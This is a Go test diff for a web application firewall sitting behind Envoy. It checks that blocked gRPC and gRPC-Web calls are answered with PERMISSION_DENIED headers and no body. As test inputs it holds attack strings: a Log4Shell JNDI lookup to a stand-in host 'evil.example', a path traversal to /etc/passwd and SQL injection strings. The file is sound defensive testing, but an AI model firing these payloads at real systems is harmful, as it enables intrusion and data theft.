@@ -111,3 +111,104 @@ func TestGRPC(t *testing.T) {
 		}
 	}
 }
+
+// immediate returns an immediate response's headers, by lower-case name.
+func immediate(t *testing.T, r *extprocv3.ProcessingResponse) (*extprocv3.ImmediateResponse, map[string]string) {
+	t.Helper()
+	ir := r.GetImmediateResponse()
+	if ir == nil {
+		t.Fatalf("answer %v, want an immediate response", r)
+	}
+	set := map[string]string{}
+	for _, h := range ir.GetHeaders().GetSetHeaders() {
+		set[h.GetHeader().GetKey()] = string(h.GetHeader().GetRawValue())
+	}
+	return ir, set
+}
+
+// TestGRPCDenial: a denied gRPC call is answered as gRPC: grpc-status 7
+// (PERMISSION_DENIED) and a grpc-message in the headers, and no body.
+// Before, the engine answered a 403 with a text body, which Envoy turned
+// into a grpc-status from the HTTP status, and a gRPC-Web client got the
+// 403 as it was.
+func TestGRPCDenial(t *testing.T) {
+	const attack = "${jndi:ldap://evil.example/a}"
+	web := func(path string, kv ...string) *extprocv3.ProcessingRequest {
+		m := grpcHeaders(path, kv...)
+		for _, h := range m.GetRequestHeaders().GetHeaders().GetHeaders() {
+			if h.GetKey() == "content-type" {
+				h.RawValue = []byte("application/grpc-web-text+proto")
+			}
+		}
+		return m
+	}
+	tests := []struct {
+		name string
+		msgs []*extprocv3.ProcessingRequest
+		// HTTP status Envoy answers with: 403 for gRPC, which Envoy
+		// answers as a gRPC call itself (HTTP 200); 200 for gRPC-Web,
+		// whose trailers-only form Envoy sends as it is.
+		status      int
+		contentType string
+	}{
+		{"attack in metadata", []*extprocv3.ProcessingRequest{
+			grpcHeaders("/helloworld.Greeter/SayHello", "x-api-key", attack), body(grpcMessages("world"), true),
+		}, 403, "application/grpc"},
+		{"attack in the path, decided on the headers", []*extprocv3.ProcessingRequest{
+			withEOS(grpcHeaders("/helloworld.Greeter/../../../../etc/passwd")),
+		}, 403, "application/grpc"},
+		// A JSON body only labelled gRPC is inspected as such, and its
+		// client still asked for a gRPC answer.
+		{"json labelled grpc", []*extprocv3.ProcessingRequest{
+			grpcHeaders("/api/search"), body(`{"q":"1' OR '1'='1' -- "}`, true),
+		}, 403, "application/grpc"},
+		{"grpc-web text", []*extprocv3.ProcessingRequest{
+			web("/helloworld.Greeter/SayHello", "x-api-key", attack), body("AAAAAAA=", true),
+		}, 200, "application/grpc-web-text"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			var logs bytes.Buffer
+			e := newEnvoy(t, newPipeline(t, pipeline.ModeBlock), 64, &logs)
+			resps := e.exchange(t, tt.msgs...)
+			ir, set := immediate(t, resps[len(resps)-1])
+			if got := int(ir.GetStatus().GetCode()); got != tt.status {
+				t.Errorf("status %d, want %d", got, tt.status)
+			}
+			if got := ir.GetGrpcStatus(); got == nil || got.GetStatus() != 7 {
+				t.Errorf("grpc_status %v, want 7 (PERMISSION_DENIED)", got)
+			}
+			want := map[string]string{
+				"content-type": tt.contentType,
+				"grpc-status":  "7",
+				"grpc-message": "Forbidden (request ID envoy-id-1)",
+				"x-request-id": "envoy-id-1",
+			}
+			for k, v := range want {
+				if set[k] != v {
+					t.Errorf("%s %q, want %q (headers %v)", k, set[k], v, set)
+				}
+			}
+			// With a body, Envoy would make it the grpc-message.
+			if len(ir.GetBody()) != 0 {
+				t.Errorf("body %q, want none", ir.GetBody())
+			}
+		})
+	}
+
+	// Anything else is answered as before.
+	var logs bytes.Buffer
+	e := newEnvoy(t, newPipeline(t, pipeline.ModeBlock), 64, &logs)
+	resps := e.exchange(t, headers("GET", "/?id=1%27%20OR%20%271%27%3D%271", true))
+	ir, set := immediate(t, resps[0])
+	if ir.GetStatus().GetCode() != 403 || ir.GetGrpcStatus() != nil || set["grpc-status"] != "" ||
+		set["content-type"] != "text/plain; charset=utf-8" || string(ir.GetBody()) != "Forbidden\n" {
+		t.Fatalf("HTTP denial %v", ir)
+	}
+}
+
+// withEOS ends the request with its headers.
+func withEOS(m *extprocv3.ProcessingRequest) *extprocv3.ProcessingRequest {
+	m.GetRequestHeaders().EndOfStream = true
+	return m
+}
